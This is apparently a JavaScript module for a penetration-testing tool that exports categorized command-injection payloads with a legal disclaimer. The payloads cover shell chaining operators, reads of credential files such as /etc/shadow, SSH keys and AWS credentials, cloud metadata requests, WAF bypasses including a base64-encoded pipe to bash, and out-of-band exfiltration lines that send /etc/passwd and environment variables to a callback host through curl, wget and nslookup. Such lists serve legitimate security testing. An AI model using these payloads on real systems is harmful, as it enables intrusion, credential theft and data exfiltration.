// Command Injection Payload Generator - Educational Penetration Testing Tool
// WARNING: For authorized testing and educational purposes only

export const commandInjectionPayloads = {
  unixOperators: {
    name: 'Unix Command Operators',
    description: 'Standard Unix shell command chaining and injection operators',
    category: 'Unix Operators',
    payloads: [
      { name: 'Semicolon separator',        code: '; id' },
      { name: 'AND operator',               code: '&& id' },
      { name: 'OR operator',                code: '|| id' },
      { name: 'Pipe to id',                 code: '| id' },
      { name: 'Newline separator',          code: '%0a id' },
      { name: 'Background execution',       code: '& id' },
      { name: 'Backtick substitution',      code: '`id`' },
      { name: 'Command substitution $(...)', code: '$(id)' },
      { name: 'Chained with semicolons',    code: '; echo "pwned"; id; whoami' }
    ]
  },
  windowsOperators: {
    name: 'Windows Command Operators',
    description: 'Windows cmd.exe and PowerShell injection operators',
    category: 'Windows Operators',
    payloads: [
      { name: 'Ampersand separator',         code: '& whoami' },
      { name: 'AND operator',                code: '&& whoami' },
      { name: 'OR operator',                 code: '|| whoami' },
      { name: 'Pipe',                        code: '| whoami' },
      { name: 'Carriage return + newline',   code: '%0d%0a whoami' },
      { name: 'PowerShell command',          code: '; Get-Process' },
      { name: 'Caret escape (cmd)',          code: '^& whoami' },
      { name: 'Chained with ampersand',      code: '& echo pwned & whoami' }
    ]
  },
  fileRead: {
    name: 'File Read Payloads',
    description: 'Read sensitive files via command injection',
    category: 'File Read',
    payloads: [
      { name: 'Read /etc/passwd',            code: '; cat /etc/passwd' },
      { name: 'Read /etc/shadow',            code: '; cat /etc/shadow' },
      { name: 'Read /etc/hosts',             code: '; cat /etc/hosts' },
      { name: 'Read SSH private key',        code: '; cat /root/.ssh/id_rsa' },
      { name: 'Read environment variables',  code: '; env' },
      { name: 'Read AWS credentials',        code: '; cat ~/.aws/credentials' },
      { name: 'Windows - read SAM',          code: '& type C:\\Windows\\System32\\config\\SAM' },
      { name: 'Windows - environment vars',  code: '& set' },
      { name: 'List current directory',      code: '; ls -la' },
      { name: 'Windows - list directory',    code: '& dir' }
    ]
  },
  networkEnum: {
    name: 'Network Enumeration',
    description: 'Enumerate network configuration and connectivity',
    category: 'Network Enum',
    payloads: [
      { name: 'Ping localhost',              code: '; ping -c 1 127.0.0.1' },
      { name: 'Network interfaces (Linux)',  code: '; ifconfig' },
      { name: 'Network interfaces (ip)',     code: '; ip a' },
      { name: 'Network interfaces (Windows)', code: '& ipconfig /all' },
      { name: 'ARP table',                   code: '; arp -a' },
      { name: 'Routing table',               code: '; route -n' },
      { name: 'Netstat connections',         code: '; netstat -an' },
      { name: 'DNS lookup',                  code: '; nslookup attacker.com' },
      { name: 'Curl internal service',       code: '; curl http://169.254.169.254/latest/meta-data/' }
    ]
  },
  filterBypasses: {
    name: 'Filter Bypass Techniques',
    description: 'Bypass input filters and WAFs',
    category: 'Filter Bypasses',
    payloads: [
      { name: 'IFS separator (space bypass)', code: ';${IFS}id' },
      { name: 'Quote insertion',              code: ';i"d' },
      { name: 'Brace expansion',              code: ';{id}' },
      { name: 'Wildcard in command',          code: ';/???/id' },
      { name: 'Hex-encoded space',            code: ';id%20' },
      { name: 'Base64 decode + execute',      code: ';echo aWQ= | base64 -d | bash' },
      { name: 'Newline bypass (%0a)',         code: '%0aid' },
      { name: 'Carriage return bypass',       code: '%0did' },
      { name: 'Variable splitting',           code: ';a=i;b=d;$a$b' },
      { name: 'Escaped characters',           code: ';\\i\\d' },
      { name: 'Unicode slash bypass',         code: ';%ef%bc%8fbin%ef%bc%8fid' },
      { name: 'Double URL-encoded semicolon', code: '%253b id' }
    ]
  },
  oobExfil: {
    name: 'OOB Exfiltration',
    description: 'Out-of-band data exfiltration via DNS / HTTP',
    category: 'OOB Exfiltration',
    payloads: [
      { name: 'DNS exfil via nslookup',      code: '; nslookup $(id).{CALLBACK_HOST}' },
      { name: 'DNS exfil via curl',          code: '; curl http://$(id).{CALLBACK_HOST}/' },
      { name: 'HTTP exfil - passwd',         code: '; curl -d @/etc/passwd http://{CALLBACK_HOST}/' },
      { name: 'HTTP exfil - env vars',       code: '; curl "http://{CALLBACK_HOST}/?data=$(env | base64 -w0)"' },
      { name: 'Wget exfil',                  code: '; wget -O- http://{CALLBACK_HOST}/$(cat /etc/passwd | base64 -w0)' }
    ]
  }
}

export const getAllCategories = () => {
  const categories = new Set()
  Object.values(commandInjectionPayloads).forEach(group => categories.add(group.category))
  return Array.from(categories)
}

export const getPayloadsByCategory = (category) => {
  return Object.entries(commandInjectionPayloads).filter(([, group]) => group.category === category)
}

export const disclaimer = `
⚠️  DISCLAIMER & LEGAL NOTICE ⚠️

This tool is for AUTHORIZED SECURITY TESTING & EDUCATIONAL PURPOSES ONLY.

Command injection vulnerabilities allow attackers to execute arbitrary OS commands on a server. Only use this tool if you:
✓ Have explicit written authorization from the system owner
✓ Are testing your own systems or systems you own
✓ Are in an authorized penetration testing engagement
✓ Understand the legal implications in your jurisdiction

Unauthorized access to computer systems is ILLEGAL and may result in criminal prosecution.
`
